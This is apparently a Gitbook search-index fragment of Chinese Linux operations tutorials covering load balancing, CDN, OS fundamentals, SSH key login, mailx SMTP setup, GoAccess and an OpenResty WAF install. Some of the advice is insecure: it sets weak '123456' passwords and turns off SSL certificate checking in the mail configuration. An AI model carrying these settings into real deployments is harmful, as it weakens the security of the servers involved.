名词：DNS是客户端发送请求中一个非常重要的中转，他的作用是将用户请求的URL映射为具体的IP地址，全世界有13台根服务器，但通常为我们进行域名解析的并不是根服务器，而是直接访问我们的 LDNS（Local DNS Server），通常由网络运营商维护。 最早的负载均衡就是利用搭建本地DNS服务器实现的，实现方式简单易懂，为同一个主机名分配多个映射 ，可采用轮循，随机等方式分配请求。 看上去没什么问题，但是在使用过程中会发现，如果其中一个地址down机，我们是无法及时发现的，如果有用户被分配到这个主机就会出现访问失败的状况，同时我们也无法判断每个server的负载，可能会出现，某个server几乎闲置，另外一个server负载压力极高的情况。 硬件设备 名词：负载均衡器（Load Balancer），负载均衡器通常作为独立的硬件置于客户端与服务器之间。 负载均衡设备拥有非常好的负载均衡性能，他拥有众多的负载均衡策略（权重，动态比率，最快模式，最小连接数等），可以保证以相对较优的方式分配请求。 不过好的东西总是有代价的，那就是价格，一台负载均衡器的售价往往高达十几万甚至几十万，许多企业并不愿意为它买单。 反向代理 名词：Nginx。高性能，轻量级，已经成了人们对Nginx的第一印象，Nginx可作为HTTP服务器，在处理高并发请求的时候拥有比现在主流的Apache服务器更高的性能，同时Nginx也是一个优秀的反向代理服务器。 第一次听到“反向代理”，可能有些陌生，但如果了解与之对应的正向代理就很好理解了，正向代理通常由客户端主动链接，比如我们的科学的上网方式就是使用正向代理，以达到间接访问网站的目。 而反向代理在服务器端，无需主动链接，当我们访问拥有反向代理的网站时，实际访问的是其反向代理服务器，而非真正的服务器，当请求到达反向代理服务器时，反向代理服务器再将请求转发至服务器。 反向代理是实现负载均衡的主流手段之一，通常使用Nginx等服务器搭建，Nginx同样拥有众多的分配策略，以保证平均分配压力。 Nginx反向代理： 　　　　　　　　　　　　　　　　 BIGIP（硬件）负载均衡： 2）CDN 视频总在缓冲，图片各种加载不出来，几年前是再正常不过的事了，在当时大家也没觉得是回事，但把这种情况放在现在，我想人们绝对直接就小红叉了吧，那么我们如何避免这样的情况呢？这就是我要说的，内容分发网络（Content Delivery Network），简称：CDN。 CDN简单的来说就是存储一些静态文件的一台或多台服务器，通过复制，缓存等方式，将文件保存其中。 1.哪些是静态文件？ css，html，图片，媒体都属于静态文件，也就是说用户发送的请求不会影响静态文件的内容，而jsp，php等文件就不属于静态文件，因为他们的内容会因我们的请求而发生改变。 2.CDN如何实现加速？ 通常情况下，我们所要的数据都是从主服务器中获取，但假如我们的主服务器在南方，而访问用户在北方，那么访问速度就会相对变慢，变慢的原因有很多，例如传输距离，运营商，带宽等等因素，而使用CDN技术的话，我们会将CDN节点分布在各地，当用户发送请求到达服务器时，服务器会根据用户的区域信息，为用户分配最近的CDN服务器。 3.CDN数据从哪里来？ 复制，缓存，CDN服务器可以在用户请求后缓存文件，也可以主动抓取主服务器内容。 分布在各地的CDNS： Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/operating-system-based.html":{"url":"doc/linux-basis/operating-system-based.html","title":"资深运维工程师必须了解的操作系统基础","keywords":"","body":"资深运维工程师必须了解的操作系统基础 操作系统的介绍 操作系统诞生的背景 在操作系统出现之前软件都是直接运行在硬件之上的,因为硬件就是为了实现某个特定功能(例如弹道导弹计算)，但是随着计算机性能的不断提高，可以同时在一个硬件上同时运行多个软件，这些软件都需要访问硬件资源(CPU、内存、磁盘、网卡)，此时需要一个协调者，因此操作系统就诞生了。 操作系统演变 操作系统从最早期的单用户操作系统发展成现在的个人计算机，甚至是分布式计算的演变过程。 单用户操作系统:一次只能支持一个用户程序的运行，向用户提供联机交互式的工作环境，例如DOS。 批处理系统:用户将一批作业交给操作系统后就不再交互，由操作系统自动运行，提高系统运行效率。 多道程序系统:一台电脑上运行多个程序，程序控制CPU处理顺序。 分时系统:提高系统利用率，操作系统控制CPU的处理顺序 个人计算机:每个用户对应一个系统，廉价，方便，易用 分布式计算:每个用户对应多个系统，云计算，大数据处理 操作系统的功能和分类 操作系统(Operating System)是一个通用目的的软件程序，提供了硬件驱动(CPU、内存、声卡、显卡、网卡)、进程管理、内存管理、网络管理、安全管理、文件管理等通用功能提供给系统软件和应用软件使用。 操作系统介于应用软件和计算机硬件之间，给应用软件提供开发和运行平台，同时管理和调度硬件资源。 平常使用的应用软件(微信、支付宝、wps)都是运行在操作系统之上，利用操作系统提供的通用功能实现听音乐、上网、聊天等等应用。因为有了操作系统，应用软件开发人员只需要专注功能实现，不需要关注硬件差异性。 目前主流的操作系统包含 服务器端的RHEL、CentOS(RHEL社区版)、Ubuntu Server 和桌面端 Windows10、 macOS、Ubuntu桌面版以及移动端Android 、IOS、华为鸿蒙OS。 Linux运维架构主要是围绕CentOS与Ubuntu Server两个系统以及相关的生态展开。 操作系统的核心概念 操作系统的核心概念对初学者来说可能难以理解，但是如果你学完Linux系统之后会有更加深入的理解 接口 操作系统通过接口的方式，建立了用户与计算机硬件的沟通方式。用户通过调用操作系统的接口来使用计算机的各种服务。 接口(interface):来源于电气工程学科，指的是插座与插头的连接口，起到将电与电气连接起来的功能。后来延伸到软件工程里，指软件包向外提供的功能模块的函数接口，所以接口是用来连接两个东西，信号转换和屏蔽细节。 操作系统一般会提供两个重要的接口来满足用户的一些一般性的使用需求: 命令行接口(Command Line Interface) 在Linux系统上实际上是一个叫bash shell的终端程序提供的功能，该程序底层的实质还是调用一些操作系统提供的函数。 图形界面接口（Graphic User Interface） 窗口界面通过编写的窗口程序来接收来自操作系统消息队列的一些鼠标、键盘动作，进而做出一些响应。Windows,macOS,Ubuntu Desktop都是使用窗口界面完成绝大多数日常任务，适用于广大普通用户。因此在桌面端的Windows操作系统占据广大市场份额。 ABI ABI(Application Binary Interface) 即应用程序二进制接口，描述了应用程序与操作系统之间的底层接口，允许编译好的目标代码在使用兼容ABI的系统中无需改动就能运行。 Windows中程序的运行格式通常是PE(Protable Executable)格式，还有一些依赖的动态链接库(文件名后缀通常是.dll 即dynamic link library)以及库文件(后缀名是.lib) 我们可以将Windows上的记事本程序(C:\\Windows\\notepad.exe)使用Moba xTerm上传到Linux上，然后使用file notepad.exe命令查看该程序的格式信息 [root@centos8-1 ~]# file notepad.exe notepad.exe: PE32 executable (GUI) Intel 80386, for MS Windows Linux中程序的运行格式通常是ELF(Executable and Linking Format),还有一些依赖的库文件(后缀名通常是.so即shared object),Linux中可执行程序和后缀名无关，甚至可以没有后缀。 [root@centos8-1 ~]# file /bin/ls /bin/ls: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f4154ce8a36c20d9aa270cc21c6b25ec026ac00f, stripped 因为每个操作系统的ABI不同，也就意味着Windows上运行的程序(例如notepad.exe)不能在Linux上运行，而开发人员在开发应用软件时通常要针对不同的操作系统开发不同的版本。 [root@centos8-1 ~]# ./notepad.exe # 运行notepad.exe 发现提示没有执行权限 -bash: ./notepad.exe: Permission denied [root@centos8-1 ~]# chmod +x notepad.exe # 给记事本添加执行权限 [root@centos8-1 ~]# ./notepad.exe # 再次运行发现提示执行程序的格式错误 -bash: ./notepad.exe: cannot execute binary file: Exec format error API API(Application Programming Interface) 即应用程序编程接口，API定义了源代码和库函数之间的接口，开发人员在开发程序时可以调用系统提供的API来完成某些功能，因此同样的源代码可以支持在这个API的任何系统编译。 为了统一规范，IEEE在操作系统上定义了一系列的API标准:POSIX（Portable Operating System Interface）即可移植的操作系统接口，实现了POSIX标准兼容的程序可以在其他POSIX操作系统编译执行。 现在的高级编程语言(Java,Go,Python)已经实现了完全的跨平台，屏蔽了操作系统的差异,实现一次编写，到处编译\\解释运行。 如果想要在Linux下开发应用程序，就需要掌握某种高级编程语言，例如C/C++/Java/Python/Go/Ruby等等。高级语言都需要经过编译器/解释器来将高级语言编写的源程序编译/解释成计算机能识别的机器语言后执行。 其中Linux内核和硬件驱动使用C语言和少数汇编语言开发的，汇编语言将机器指令使用英文代替，无法移植。而Linux系统的应用是使用C/C++/Java/Python/Go/Ruby语言开发的，例如RocketMQ是Java开发的，Docker是Go语言开发的，JumpServer、Ansible是Python开发的。 想要高薪就业、在IT行业长久发展，必须掌握系统运维架构与应用开发。运维开发语言首推Python,Go，而大型分布式互联网应用(电商、金融、支付、物流)首选语言是Java。 目前比较火的SRE工程师岗位实际上就是运维+架构+开发的组合，而且薪水也比较高,如果大家的学习能力OK，建议往SRE方向发展。 库函数和系统调用 对于非一般性使用需求，操作系统提供了一系列的函数调用给软件开发者，由软件开发者来实现一些用户需要的功能。这些函数调用由于是操作系统内核提供的，为了区别于一般的函数调用，被称为系统调用。 比如使用C语言进行软件开发时，经常使用的printf()函数，它的内部实际上就是通过write这个系统调用，让操作系统内核把字符打印在屏幕上。 库函数和系统调用 用户态和内核态 计算机硬件资源都是操作系统内核进行管理，目前的操作系统都是基于多任务，多用户的。如果每个用户进程都可以随意访问操作系统的内核模块，改变状态，那么整个系统的稳定性、安全性都大大降低。 为了让内核程序与用户程序隔离开，在硬件层面上提供了一个机制，将程序执行的状态分成了不同的级别，从Ring 0到Ring 3，数字越小，访问级别越高。0代表内核态，在该特权级别下，所有内存上的数据都是可见的，可访问的。3代表用户态，在这个特权级下，程序只能访问一部分的内存区域，只能执行一些特定的指令。 用户态和内核态 如果应用程序想要访问硬件资源,此时需要发送请求给内核，由内核和硬件的交互。 用户态和内核态 用户空间和内核空间 用户空间(User Space) 表示用户程序的运行空间，为了安全，用户空间和内核空间是隔离的，即使用户的程序崩溃，也不会影响内核。用户空间只能执行简单的运算，不能直接调用系统资源，必须通过系统接口(system call) 才能向内核发出指令。 内核空间（Kernel Space) 表示内核的运行空间，可以执行任意指令，调用系统的一切资源。 用户空间和内核空间 下面以一段C语言代码片段来说明用户空间和内核空间 str =\"www.ittimeline.net\"; //用户空间 x=100; //用户空间 x=x+100; //用户空间 file.write(str); //切换到内核空间 y=x+200 //切换到内核空间 第1,2,3行都是简单的赋值操作，直接在用户空间执行，第四行需要写入文件，就需要切换到内核空间，因为用户不能直接写文件，需要通过内核来执行。第五行又是赋值运算，需要从内核空间切换回用户空间。内核空间和用户空间的切换需要消耗资源。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/Linux服务器配置SSH免密码登陆.html":{"url":"doc/linux-basis/Linux服务器配置SSH免密码登陆.html","title":"Linux服务器配置SSH免密码登陆","keywords":"","body":"Linux服务器配置SSH免密码登陆 实现功能 node179，node181，node182上实现www用户免密码访问，密钥登录。 在三台服务器上设置www的密码 #passwd www 密码设置123456 服务器名称，修改hosts，ssh默认端口由22改改为60920： node179 192.168.4.179 node181 192.168.4.181 node182 192.168.4.182 在node179上操作 # su -l www $ ssh-keygen 【一路回车】 生成公钥和私钥 $ ll /home/www/.ssh/* -rw------- 1 www www 1679 Feb 18 11:13 /home/www/.ssh/id_rsa -rw-r--r-- 1 www www 391 Feb 18 11:13 /home/www/.ssh/id_rsa.pub $ ssh-copy-id -p 60920 \"www@192.168.4.181\" 输入node181的密码 $ ssh-copy-id -p 60920 \"www@192.168.4.182\" 输入node182的密码 测试： $ ssh -p 60920 www@192.168.4.181 $ ssh -p 60920 www@192.168.4.182 是否需要密码 在node181查看 cat /home/www/.ssh/authorized_keys 是否有 node179的公钥。 在181上操作 # su -l www $ ssh-keygen $ ssh-copy-id -p 60920 \"www@192.168.4.179\" 测试登录： ssh -p 60920 www@192.168.4.179 在182上操作 # su -l www $ ssh-keygen $ ssh-copy-id \"-p 60920 www@192.168.4.179\" 测试登录： ssh -p 60920 www@192.168.4.179 第二种方法 直接将公钥写入到 authorized_keys文件中。 A服务器要免密钥登录到B服务器，则将A的公钥，写入到B的authorized_keys文件中。 # su -l www $ mkdir /home/www/.ssh $ chmod 700 /home/www/.ssh $ vi /home/www/.ssh/authorized_keys 将179中的/home/www/.ssh/id_rsa.pub 写入 $ chmod 600 /home/www/.ssh/authorized_keys 在179上测试： ssh -p 60920 www@192.168.4.182 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/一张图学会Git.html":{"url":"doc/linux-basis/一张图学会Git.html","title":"一张图学会Git","keywords":"","body":"一张图学会Git git对于程序员是必须掌握的工具，Git是目前世界上最先进的分布式版本控制系统。星哥从Git官网上将知识点汇总成为Git入门和使用规范.xmind的文档。 Git地址： https://github.com/funet8/Git-Tutorial 更新测试 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 16:43:06 "},"doc/basis-tools/":{"url":"doc/basis-tools/","title":"服务器基础工具","keywords":"","body":"基本应用工具 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/basis-tools/Linux使用mail配合smtp发送邮件.html":{"url":"doc/basis-tools/Linux使用mail配合smtp发送邮件.html","title":"Linux使用mail配合smtp发送邮件","keywords":"","body":"Linux使用mail配合smtp发送邮件 由于工作需要结合shell脚本需要发送邮件通知，linux自带的mail可以实现外部smtp发邮件。不需要本地配置postfix，sendmail邮件服务器。 本文教程包含25端口发送邮件和mail使用465端口加密发邮件，mail基本命令发送邮件三个知识点，测试系统是centos7 安装工具 # yum -y install mailx # yum -y install sendmail centos6 # /etc/init.d/sendmail start # chkconfig sendmail on centos7 systemctl enable sendmail 关闭其他的邮件工具 # systemctl stop sendmail # systemctl stop postfix 开启邮箱imap/smtp服务 我这里使用的是163的邮箱，步骤如下： 1.登录邮箱后，点击页面顶部的“设置”菜单，在下拉框中点击“POP3/SMTP/IMAP”项 2.进入到如下页面，勾选IMAP/SMTP服务项，根据步骤完成即可（由于我这里已经开启过，就不再演示了。初始勾选后会让你填写手机号码，发送验证码，成功填写后，会让你输入授权码，这个是作为smtp登录的密码使用的，详情请看163的smtp说明） 配置发送的邮箱和密码，注意不是你的邮箱登录密码！ # vi /etc/mail.rc 在底部添加： set from=\"xxx@163.com\" set smtp=smtp.163.com set smtp-auth-user=xxx@163.com set smtp-auth-password=自己填写的授权码 set smtp-auth=login 测试发送 echo -e \"你好！n我来看看你n哈哈\" | mail -s \"测试邮件\" shoujianren@163.com mail -s \"`date +%F-%T`\" shoujianren@163.com 有的云服务器商封了25端口。 1.开工单，让客服把25号端口开通，例如阿里云TCP 25端口解封申请 https://help.aliyun.com/knowledge_detail/56130.html 2.使用加密端口发送邮件。 mail使用465端口加密发邮件 今天由于服务需求，需要服务器需要发送邮件；但是不论用什么办法，发送邮件总是失败；最终发现原因：阿里云实例服务器默认禁止了25端口； 关闭其它的邮件工具 # systemctl stop sendmail # systemctl stop postfix 安装mailx yum install mailx 开启smtp 参考上一步 请求数字证书 这里用的163邮箱，所以向163请求证书 # mkdir /root/.certs # echo -n | openssl s_client -connect smtp.163.com:465 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /root/.certs/163.crt # certutil -A -n \"GeoTrust SSL CA\" -t \"C,,\" -d /root/.certs -i /root/.certs/163.crt # certutil -A -n \"GeoTrust Global CA\" -t \"C,,\" -d /root/.certs -i /root/.certs/163.crt # certutil -A -n \"GeoTrust SSL CA - G3\" -t \"Pu,Pu,Pu\" -d /root/.certs/./ -i /root/.certs/163.crt # ls /root/.certs/ 163.crt cert8.db key3.db secmod.db # certutil -L -d /root/.certs Certificate Nickname Trust Attributes SSL,S/MIME,JAR/XPI GeoTrust SSL CA P,P,P 配置/etc/mail.rc # vim /etc/mail.rc set from=xxx@163.com #之前设置好的邮箱地址 set smtp=\"smtps://smtp.163.com:465\" #邮件服务器 set smtp-auth-user=xxx@163.com #之前设置好的邮箱地址 set smtp-auth-password=xxxx #授权码 set smtp-auth=login #默认login即可 set ssl-verify=ignore #ssl认证方式 set nss-config-dir=/root/.certs #证书所在目录 发送邮件测试 # echo \"邮件正文\" | mail -s \"邮件主题\" xxx@163.com 邮件发送成功 mail基本命令发送邮件 1.标题为\"test\"内容为空的邮件，容易被邮箱服务判为垃圾邮件。 mail -s \"test\" username2@163.com 2.以文件为内容作为邮件正文： echo \"222222222\" > /root/mail1 mail -s test username2@163.com 3.使用管道进行邮件发送 echo \"hello,username3....\" | mail -s \"hello\" username3@163.com 4.发送附件 在linux下使用mail命令发送附件也很简单，不过首先需要安装uuencode软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，直接使用centos的yum源可能找不到uuencode命令的包sharutils，我这里使用了网易Yum源。 # yum -y install sharutils # uuencode /root/mail1 | mail -s \"fujian\" xxxx@163.com 5、使用外部smtp来发送邮件 # vi /etc/mail.rc #文末添加以下 set from=username1@163.com smtp=smtp.163.com set smtp-auth-user=username1@163.com smtp-auth-password=password smtp-auth=login # source /etc/mail.rc 【本人测试，不需要这步即可】 # mail -s \"testmail\" username@163.com Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/basis-tools/GoAccess轻量nginx日志分析工具.html":{"url":"doc/basis-tools/GoAccess轻量nginx日志分析工具.html","title":"GoAccess轻量nginx日志分析工具","keywords":"","body":"GoAccess轻量nginx日志分析工具 什么是GoAccess GoAccess 是一款开源、实时，运行在命令行终端下的 Web 日志分析工具。 该工具提供快速、多样的 HTTP 状态统计。 分析结果，可以通过 XShell 等客户端工具查看，并且可以生成 Html 报告。 GitHub 地址：https://github.com/allinurl/goaccess 官网地址：http://goaccess.io/ 安装GoAccess 测试环境， centos7 # yum -y install glib2 glib2-devel ncurses ncurses-devel GeoIP GeoIP-devel # wget http://tar.goaccess.io/goaccess-1.2.tar.gz # tar -xzvf goaccess-1.2.tar.gz # cd goaccess-1.2/ # ./configure --enable-geoip --enable-utf8 # make && make install 默认配置文件在 vi /usr/local/etc/goaccess.conf time-format %H:%M:%S date-format %d/%b/%Y log-format 接下来我们测试一下。现在就需要根据nginx的日志格式来写goaccess的规则 goaccess -f /usr/local/nginx/logs/access.log -a > /root/test/report.html 网络上大部分的文章和介绍都只适合没任何修改的nginx日志格式，对自定义的log format都不怎么涉及。如果你采用的自定义的nginx日志格式，那么此处就需要特别注意，一旦log-format配置不对，goaccess分析的结果会差很大。 以我nginx日志格式为例： log_format main '$server_name $remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\" \"$http_x_forwarded_for\" $upstream_addr $request_time $upstream_response_time; 按照goaccess预设的log format，这样的日志是没法分析的，所以我们需要自定义log format。 我的log format为： log-format %^ %h %^ %^ [%d:%t %^] “%r” %s %b “%R” “%u” “%^” %^ %T %^ $server_name ---> %h ---> 主机(客户端IP地址,IPv4和IPv6) [$time_local] ---> [%d:%t %^] ---> 时间 $request ---> \"%r\" ---> 客户机的请求,这需要具体分隔符在请求(单引号、双引号或其他)解析。如果没有,我们必须使用特殊的格式说明符的组合%m %U %H。 $status ---> %s ---> 发送客户端的状态码 $body_bytes_sent ---> %b ---> 给客户端返回大小 $http_referer ---> %R ---> “Referrer”HTTP请求头 $http_user_agent ---> \"%u\" ---> UA $http_x_forwarded_for ---> $request_time ---> %T ---> 服务请求的时间,以秒或毫秒。注意:%D将优先于%T如果都使用。 为了设置正确的log format，踩了不少坑，先列出来避免大家重复碰到。 （1） log format默认是按照空格分隔日志信息的，所以，对于包含了特殊字符如空格等信息的字段，必须包含在“”里面。如字段request http_user_agent等 （2） nginx日志格式里面，采用空格分隔，但是此处一定注意，只能用一个空格。当时我有个地方用了两个空格，直接导致goaccess结果出错。 （3） nginx日志中的每一个字段都要和log format中的一一对应，如果log format中不需要nginx中的某一个信息，则用%^跳过该信息。 （4） 对于nginx日志中的每一个 - log format都需要一个%^来跳过， 如果是“-”， 则用“%^” （5） 如果nginx日志信息中有：， 则需要在log format中也显示出来。例如nginx日志中$time_local就包含了：，所以在log format的相应位置也是 [%d:%t %^] 希望这些能帮助使用goaccess的朋友。 goaccess -f log [-c][-r][-m][-h][-q][-d][-g][-a][-o csv|json][-e IP_ADDRESS][...] 自定义参数及其对应nginx的accesslog中的fromat %x 匹配替代time_format和date_format的设定，可以同时调用两个的全局设置（时间戳） %t 匹配替代 time-format 的设置%d 匹配替代 date-forma 的设置 %h 客户端ip $remote_addr %r 请求方法 $request%m 请求算法 相当于$request中的 post或get的匹配%U 请求的URL路径(包括任何查询字符串) 相当于$request中的 URL匹配 %H 请求的协议 相当于$request中的 HTTP/1.1 %s 服务端返回客户端的状态code $status %b 返回客户端的body size $body_bytes_sent %R refer $http_referer%u user-agent $http_user_agent%D 服务请求的时间，以微秒为单位 $request_time %T 服务请求的时间，以秒为单位 $request_time %L 服务请求的时间，以毫秒为单位 $request_time %^ 忽略官方没有对应参数的区域 以上是官方给出的所有匹配参数，原版见 http://www.goaccess.io/man 以下是我自定义的nginx日志格式： log_format main_zdy '$request_time - IP:$remote_addr - RealIP:$http_x_forwarded_for - [$time_local] $request - $status - $http_user_agent - $host - from:$http_referer'; 记录日志： 0.000 - IP:3.3.3.3 - RealIP:1.1.1.1, 2.2.2.2 - [28/Jul/2017:16:04:15 +0800] POST /site/index.html HTTP/1.1 - 200 - Apache-HttpClient/UNAVAILABLE (java 1.4) - www.111111111.com - from:http://www.111111111.com 0.216 - IP:4.4.4.4 - RealIP:5.5.5.5, 6.6.6.6 - [28/Jul/2017:15:53:04 +0800] GET /client/serverlist?jsonpCallback=jQuery18206177038959697163_1501228347875&gid=163&wid=196&_=1501228353156 HTTP/1.1 - 200 - Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727) - www.111111111.com - from:http://www.1111111111111.com/ goaccess的格式： log-format %T %^ IP:%^ %^ RealIP:~h{,\" } %^ [%d:%t %^] %m %U %H %^ %s %^ %u %^ %^ %^ from:%R %x 一个匹配时间格式的日期和时间字段和日期格式变量。这是时使用时间戳是给定的日期和时间而不是在两个独立的变量。 %t time字段匹配时间格式的变量。 %d date字段匹配日期格式的变量。 %v The服务器名称根据规范名称设置块(服务器或虚拟主机)。 %e 用户标识的人请求文档由HTTP身份验证。 %h host(客户端IP地址,IPv4和IPv6) %r 请求从客户端。这需要在请求特定的分隔符(单引号、双引号等)解析。否则,结合使用等特殊格式说明符%m %U %q 和 %H解析单个字段。注意:使用 %r 得到完整的请求或 %m %U %q 和 %H形成你的请求,不同时使用。请求方法让 %m 请求的方法。 %U 请求URL路径。注意:如果查询字符串在%U,没有必要使用%q。然而,如果URL路径,不包括任何查询字符串,可以使用%q和查询字符串将被附加到请求。 %q 查询字符串。 %H 请求协议。 %s 服务器发送给客户机的状态代码。 %b 服务器发送发送给客户端的大小。 %R 来源 %u 用户代理HTTP请求头。 %D 服务请求的时间，以微秒为单位 $request_time %T 服务请求的时间，以秒为单位 $request_time %L 服务请求的时间，以毫秒为单位作为一个十进制数。 %^ 忽略这个领域。 %~ 前进通过日志字符串直到找到(!isspace)字符进行技术改造。 ~h 主机(客户端IP地址,IPv4和IPv6)在X-Forwarded-For(XFF)领域。 For XFF, GoAccess uses a special specifier which consists of a tilde before the host specifier, followed by the character(s) that delimit the XFF field, which are enclosed by curly braces (i.e., ~h{,\"}). For example, ~h{,\" } is used in order to parse \"11.25.11.53, 17.68.33.17\" field which is delimited by a double quote, a comma, and a space. XFF,GoAccess使用特殊说明符由波浪号主机之前,紧随其后的是字符(s)划入XFF字段,由花括号封闭(即~ h { })。 例如,h ~ { }的使用是为了解析”11.25.11.53,17.68.33.17”字段由一个双引号分隔,逗号,和空间。 goaccess -f /www/logs/nginx.log -a > /data/wwwroot/web/test/report1.html -f 指定nginx日志文件 -p 指定日志格式文件 -o 输出到指定html文件 --real-time-html 实时刷新 --ws-url 绑定一个域名 生成HTML展示 将生成的文件用web服务器展示在浏览器上 goaccess -f /root/www.7477.com-access1000.log -a > /data/wwwroot/web/zabbix/1111/reporta1.html goaccess -f /root/test.log -a > /data/wwwroot/web/zabbix/1111/reporta6.html goaccess -f /root/www.7477.com-access181.log -a > /data/wwwroot/web/zabbix/1111/report.html goaccess -f /root/www.7477.com-access1000.log -a > /data/wwwroot/web/zabbix/1111/report1.html goaccess -f /root/www.funet8.com-access.log -a > /data/wwwroot/web/zabbix/1111/funet1.html goaccess -f /root/1000.log -a > /data/wwwroot/web/test/report1.html Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/web/":{"url":"doc/web/","title":"WEB服务","keywords":"","body":"WEB服务相关文档 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/web/Centos7-install-openresty-waf.html":{"url":"doc/web/Centos7-install-openresty-waf.html","title":"Centos7安装openresty实现WAF防火墙功能","keywords":"","body":"Centos7安装openresty实现WAF防火墙功能 OpenResty® 是一个结合了 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。 OpenResty® 通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。 OpenResty® 的目标是让你的Web服务直接跑在 Nginx 服务内部，充分利用 Nginx 的非阻塞 I/O 模型，不仅仅对 HTTP 客户端请求,甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及 Redis 等都进行一致的高性能响应。 系统说明 系统： centos7 ip: 192.168.1.4 实现WAF 两种方式 1.使用nginx+lua来实现WAF,须在编译nginx的时候配置上lua。 2.部署OpenResty,不需要在编译nginx的时候指定lua，本文采取此方案 WAF功能列表 支持IP白名单和黑名单功能，直接将黑名单的IP访问拒绝。 支持URL白名单，将不需要过滤的URL进行定义。 支持User-Agent的过滤，匹配自定义规则中的条目，然后进行处理（返回403）。 支持CC攻击防护，单个URL指定时间的访问次数，超过设定值，直接返回403。 支持Cookie过滤，匹配自定义规则中的条目，然后进行处理（返回403）。 支持URL过滤，匹配自定义规则中的条目，如果用户请求的URL包含这些，返回403。 支持URL参数过滤，原理同上。 支持日志记录，将所有拒绝的操作，记录到日志中去。 日志记录为JSON格式，便于日志分析，例如使用ELKStack进行攻击日志收集、存储、搜索和展示 源码安装openresty yum安装依赖库 yum install -y pcre-devel openssl-devel gcc postgresql-devel 下载源码包并且安装 从下载页 Download http://openresty.org/cn/download.html 下载最新的 OpenResty® 源码包，并且像下面的示例一样将其解压: mkdir /data/software cd /data/software wget https://openresty.org/download/openresty-1.19.9.1.tar.gz # 备用下载地址： http://js.funet8.com/centos_software/openresty-1.19.9.1.tar.gz tar -zxvf openresty-1.19.9.1.tar.gz cd openresty-1.19.9.1/ ./configure --prefix=/usr/local/openresty \\ --with-luajit \\ --without-http_redis2_module \\ --with-http_iconv_module \\ --with-http_postgres_module gmake && gmake install 参考地址： http://openresty.org/cn/installation.html 常用命令 # 启动 /usr/local/openresty/nginx/sbin/nginx # 或者指定配置文件启动 /usr/local/openresty/nginx/sbin/nginx -c /usr/local/openresty/nginx/conf/nginx.conf -p /usr/local/openresty/nginx/ 浏览器访问验证是否出现： http://IP 停止 /usr/local/openresty/nginx/sbin/nginx -s stop # 启动 /usr/local/openresty/nginx/sbin/nginx 重置 /usr/local/openresty/nginx/sbin/nginx -s reload 验证 vim /usr/local/openresty/nginx/conf/nginx.conf 添加： location /hello { default_type 'text/plain'; content_by_lua 'ngx.say(\"hello,lua\")'; } /usr/local/openresty/nginx/sbin/nginx -s reload http://IP:80/hello 是否输出：hello,lua # curl http://127.0.0.1/hello hello,lua 配置环境变量 echo '# 配置OpenResty环境变量' >> /etc/profile echo 'export OPENRESTY_HOME=/usr/local/openresty/' >> /etc/profile echo 'export PATH=${OPENRESTY_HOME}/bin:$PATH' >> /etc/profile echo 'PATH=/usr/local/openresty/nginx/sbin:$PATH' >> /etc/profile echo 'export PATH' >> /etc/profile 生效： source /etc/profile echo $OPENRESTY_HOME openresty -s reload nginx -V nginx -t # openresty -help nginx version: openresty/1.19.9.1 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /usr/local/openresty/nginx/) -e filename : set error log file (default: logs/error.log) -c filename : set configuration file (default: conf/nginx.conf) -g directives : set global directives out of configuration file 安装并且配置WAF # git clone https://github.com/unixhot/waf.git 克隆到自己的仓库： # git clone https://gitee.com/funet8/waf.git # cd /usr/local/openresty/nginx/conf/ # git clone https://gitee.com/funet8/waf.git waf-git # cp -a ./waf-git/waf /usr/local/openresty/nginx/conf/ # vim /usr/local/openresty/nginx/conf/nginx.conf #在http{}中增加，注意路径，同时WAF日志默认存放在/tmp/日期_waf.log #WAF lua_shared_dict limit 50m; lua_package_path \"/usr/local/openresty/nginx/conf/waf/?.lua\"; init_by_lua_file \"/usr/local/openresty/nginx/conf/waf/init.lua\"; access_by_lua_file \"/usr/local/openresty/nginx/conf/waf/access.lua\"; waf目录：/usr/local/openresty/nginx/conf/waf/ lua配置文件：/usr/local/openresty/nginx/conf/waf/config.lua Waf的ip黑名单：/usr/local/openresty/nginx/conf/waf/rule-config/blackip.rule Waf的ip白名单：/usr/local/openresty/nginx/conf/waf/rule-config/whiteip.rule Waf的规则存放目录：/usr/local/openresty/nginx/conf/waf/rule-config # ln -s /usr/local/openresty/lualib/resty/ /usr/local/openresty/nginx/conf/waf/resty # /usr/local/openresty/nginx/sbin/nginx -t # /usr/local/openresty/nginx/sbin/nginx -s reload 然后保存退出重启看日志 